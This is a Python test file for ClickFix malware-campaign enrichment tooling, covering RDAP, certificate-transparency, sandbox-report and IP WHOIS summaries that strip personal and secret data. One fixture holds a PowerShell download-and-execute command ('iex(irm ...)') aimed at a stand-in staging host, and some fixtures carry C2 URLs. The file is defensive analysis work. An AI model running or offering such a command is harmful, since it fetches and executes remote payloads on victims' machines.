from __future__ import annotations

import importlib
import json
import sys
from pathlib import Path


CLICKFIX_DIR = Path(__file__).resolve().parents[1] / "clickfix"
if str(CLICKFIX_DIR) not in sys.path:
    sys.path.insert(0, str(CLICKFIX_DIR))

infra = importlib.import_module("clickfix_infrastructure_enrichment")
triage = importlib.import_module("clickfix_triage_enrichment")


def test_domain_rdap_public_projection_omits_contact_data() -> None:
    raw = {
        "ldhName": "example.test",
        "handle": "D123",
        "status": ["active"],
        "events": [{"eventAction": "registration", "eventDate": "2026-01-01T00:00:00Z"}],
        "nameservers": [{"ldhName": "NS1.EXAMPLE.TEST"}],
        "entities": [
            {
                "handle": "REG-1",
                "roles": ["registrar"],
                "vcardArray": ["vcard", [["email", {}, "text", "secret@example.test"]]],
            }
        ],
    }

    public = infra._public_domain_rdap(raw)

    assert public["registrar_handles"] == ["REG-1"]
    assert public["nameservers"] == ["ns1.example.test"]
    assert "secret@example.test" not in json.dumps(public)


def test_ct_summary_limits_names_to_in_scope_domain() -> None:
    result = infra._ct_summary(
        [
            {
                "name_value": "a.example.test\nforeign.test\n*.example.test",
                "issuer_name": "CN=Issuer",
                "not_before": "2026-01-01",
            }
        ],
        "example.test",
    )

    assert result["names"] == ["*.example.test", "a.example.test"]
    assert "foreign.test" not in result["names"]


def test_triage_overview_extracts_behavioral_and_artifact_evidence() -> None:
    overview = {
        "sample": {"id": "260730-abcdefghij", "sha256": "a" * 64, "target": "sample.zip", "score": 8},
        "tasks": {
            "260730-abcdefghij-behavioral1": {
                "kind": "behavioral",
                "status": "reported",
                "target": "run.exe",
                "tags": ["stealer"],
            },
            "260730-abcdefghij-static1": {"kind": "static", "status": "reported"},
        },
        "targets": [{"family": ["testfamily"], "tags": ["family:testfamily"]}],
        "extracted": [
            {
                "resource": "behavioral1/memory/123-memory.dmp",
                "dumped_file": "extracted/payload.bin",
                "config": {"family": "testfamily", "c2": ["https://c2.test/a?token=secret"]},
            }
        ],
    }

    result = triage.summarize_overview(overview)

    assert result["families"] == ["testfamily"]
    assert result["config_endpoints"] == ["https://c2.test/a"]
    assert {item["category"] for item in result["artifact_candidates"]} == {"memory", "dumped_file"}
    assert len(result["behavioral_tasks"]) == 1


def test_triage_report_hashes_commands_and_sanitizes_network() -> None:
    raw_command = "powershell -c iex(irm 'https://stage.test/a?key=secret')"
    report = {
        "task": {"name": "behavioral1"},
        "processes": [{"image": "C:\\Windows\\powershell.exe", "cmd": raw_command}],
        "network": {"requests": [{"url": "https://c2.test/path?auth=secret"}]},
        "dumped": [{"path": "C:\\Temp\\payload.exe", "sha256": "c" * 64}],
    }

    result = triage.summarize_report(report)
    rendered = json.dumps(result, ensure_ascii=False)

    assert result["processes"][0]["image"] == "powershell.exe"
    assert len(result["processes"][0]["command_sha256"]) == 64
    assert result["network_context"] == ["https://c2.test/path"]
    assert raw_command not in rendered
    assert "secret" not in rendered


def test_current_live_separates_landing_and_stage_addresses(tmp_path: Path) -> None:
    observation = {
        "landing": [{"hops": [{"dns": {"public_addresses": ["192.0.2.10"]}}]}],
        "stages": [{"hops": [{"dns": {"public_addresses": ["198.51.100.20"]}}]}],
    }
    (tmp_path / "live-observation.json").write_text(json.dumps(observation), encoding="utf-8")

    result = infra._current_live(
        tmp_path,
        {"live": {"public_addresses": ["192.0.2.10", "198.51.100.20"]}},
    )

    assert result["landing_public_addresses"] == ["192.0.2.10"]
    assert result["stage_public_addresses"] == ["198.51.100.20"]


def test_ipwhois_projection_keeps_asn_but_drops_geolocation() -> None:
    raw = {
        "success": True,
        "ip": "203.0.113.10",
        "country_code": "JP",
        "city": "private-city-context",
        "latitude": 1.0,
        "connection": {
            "asn": 64500,
            "org": "Example Hosting",
            "isp": "Example ISP",
            "domain": "example.test",
        },
    }

    result = infra._ipwhois_summary(raw)

    assert result == {
        "ip": "203.0.113.10",
        "country_code": "JP",
        "asn": 64500,
        "organization": "Example Hosting",
        "isp": "Example ISP",
        "domain": "example.test",
    }
    assert "city" not in result
